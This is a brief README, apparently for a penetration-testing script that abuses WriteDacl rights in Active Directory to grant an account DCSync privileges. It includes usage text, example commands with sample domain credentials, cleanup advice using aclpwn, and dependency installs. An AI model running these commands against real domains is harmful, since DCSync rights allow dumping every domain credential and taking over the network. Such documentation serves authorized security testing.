# Adding DCSync Permissions
Mostly copypasta from https://github.com/tothi/rbcd-attack
```
usage: dcsync.py [-h] -dc FQDN -t USERNAME [-hashes LMHASH:NTHASH] [-k] identity

WriteDacl Attack: To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

positional arguments:
  identity              domain\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)

optional arguments:
  -h, --help            show this help message and exit
  -dc FQDN              FQDN of the Domain Controller
  -t USERNAME           Target user to be escalated
  -hashes LMHASH:NTHASH
                        Hash for LDAP auth (instead of password)
  -k                    If you want to use a Kerberos ticket

Example: ./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123

Example: ./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
```

To clean up after you are done, use ACLpwn https://github.com/fox-it/aclpwn.py. This tool is pretty old and not maintained, but you can get it to work. One thing you will need to do is replace “neo4j.v1” with just “neo4j” in database.py. To restore the ACLs to the original configuration, use the restore state file created by the DCSync tool.

Dependencies:

Impacket 

```
apt install heimdal-dev -y
apt install libkrb5-dev -y
python3 -m pip install gssapi
```
